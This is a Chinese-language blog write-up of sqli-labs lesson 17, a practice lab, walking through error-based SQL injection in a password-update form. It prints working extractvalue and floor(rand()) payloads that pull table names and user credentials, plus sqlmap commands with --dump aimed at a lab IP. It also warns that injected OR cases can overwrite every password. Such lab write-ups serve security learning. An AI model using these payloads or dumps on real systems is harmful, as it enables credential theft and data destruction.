---
title: sqli-labs lession 17 POST基于错误的更新
date: 2018-09-28 09:11:00
tags:
categories: sql注入
---
# sqli-labs lession 17 POST基于错误的更新 #
---

## 登录界面 ##

![1](/img/sql/Lesson-17/1.png)

## 手注 ##

### 分析 ###

根据题目意思要利用的是Update的错误。先检查一下UserName这一块。

发现输入一些信息后无论怎样都没触发错误。检查源码

![2](/img/sql/Lesson-17/2.png)

发现uname被check_input函数处理了。通读代码,理解一下什么意思。

	function check_input($value)
	{
	if(!empty($value))
		//检查传入的账号名为非空
		{
		// truncation (see comments)
		$value = substr($value,0,15);
		//限制用户名长度为15以下,如果传入的用户名超过15位会只使用前15位
		}
	
		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc())
		//获取当前php.ini配置文件中magic_quotes_gpc的配置选项设置

<font color=red>用phpstudy切换版本php5.2.17+Aphache</font>

可以看到php.ini配置文件中`magic_quotes_gpc`配置打开了。

![3](/img/sql/Lesson-17/3.png)

在php.net查看该函数详细信息。

![4](/img/sql/Lesson-17/4.png)


* 当php.ini里的magic_quotes_gpc=On时，提交的变量中所有的单引号，双引号，反斜线，NUL（NULL字符）会自动转为含有反斜线的转义字符

* 魔术引号（Magic Quote）是一个自动将进入PHP脚本的数据进行转义的过程。（对所有的GET，POST，Cookie数据进行转义）

这就是我输入的数据没被数据库解析的原因,它把引号转义了。

			{
			$value = stripslashes($value);
			//使用stripslashes()去掉多余的反斜杠
			}
	
		// Quote if not a number
		if (!ctype_digit($value))
			//检查$value是不是十进制数字,如果不是就执行if中的语句

![5](/img/sql/Lesson-17/5.png)

给特殊字符添加转义

			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			//转义特殊字符并用''拼接
			}
		else
			{
			$value = intval($value);
			//获取$value的整数值
			}
		return $value;
	}

写个`admin'`进去,它就做了如下处理

![6](/img/sql/Lesson-17/6.png)

根据上述username不是很好利用,利用password。因为password没有经过函数过滤。

![7](/img/sql/Lesson-17/7.png)

根据题目提示,发现这里其实是一个update的功能,用来修改账户的密码。

只要用户名查询存在,可以修改任意密码。

![8](/img/sql/Lesson-17/8.png)

修改admin用户密码为123456,提交。

![9](/img/sql/Lesson-17/9.png)

密码修改成功。

### 判断类型 ###

为了实验成功先确认php.ini文件中`magic_quotes_gpc`为`Off`,因为它是一个全局配置,启用下会将对POST请求的password中的特殊字符转义。

![10](/img/sql/Lesson-17/10.png)

单引号报错,构造报错注入。

### 获取当前数据库 ###

`' and extractvalue(null,concat(0x7e,database(),0x7e))#`

![11](/img/sql/Lesson-17/11.png)

### 获取表 ###

`' and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#`

![12](/img/sql/Lesson-17/12.png)

### 获取列 ###

`' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))#`

![13](/img/sql/Lesson-17/13.png)

### 获取字段值 ###

![14](/img/sql/Lesson-17/14.png)

`' and (select 1 from (select count(*),concat((select concat(id,'-',username,'-',password) from security.users limit 0,1), '~' , floor (rand()*2))as a from information_schema.tables group by a) as b limit 0,1) #`

## SQLMAP ##

`sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data "uname=admin&passwd='and 1=2&submit=Submit" --threads 10 --technique E`

![15](/img/sql/Lesson-17/15.png)


![16](/img/sql/Lesson-17/16.png)

`sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data "uname=admin&passwd='and 1=2&submit=Submit" -D security -T users --columns --dump`

![17](/img/sql/Lesson-17/17.png)

我擦,sqlmap这个payload把密码全改成了0,这个有待观察。

查了一些资料,终于找到问题了,update报错注入要注意不能带入or的测试用例,不然会给数据库数据带来翻天覆地的变化。下面我的url地址换了,不过其实一样。

刚开始数据库信息:

![18](/img/sql/Lesson-17/18.png)

```
--data:指定请求信息

-p:指定参数

--dbms:指定后端数据库

--threads:指定并发线程数

--method:指定请求方式

--flush-session:清除session

--fresh-queries:发起新的请求

--level 1:尝试POST和GET注入 

--risk 1:仅测试常见用例

--technique E:仅测试报错注入方式
```

`sqlmap -u "http://10.60.250.66/sql/Less-17/" --data "uname=admin&passwd=woshiadmin&submit=Submit" -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E`

![19](/img/sql/Lesson-17/19.png)

在出现这条提示后先不要执行,查看数据库,发现admin账号的密码被修改。

![20](/img/sql/Lesson-17/20.png)

<font color=red>已经找到了可能注入点,不需要测试所有用例,因为所有用例中必定会有or的用例,会对数据库进行破坏,选n</font>

![21](/img/sql/Lesson-17/21.png)

继续用no

![22](/img/sql/Lesson-17/22.png)

接下来就对了。

`sqlmap -u "http://10.60.250.66/sql/Less-17/" --data "uname=admin&passwd=woshiadmin&submit=Submit" -p passwd --dbms mysql --threads 10 --method POST  --level 1 --risk 1 --technique E -D security -T users --columns --dump`

![23](/img/sql/Lesson-17/23.png)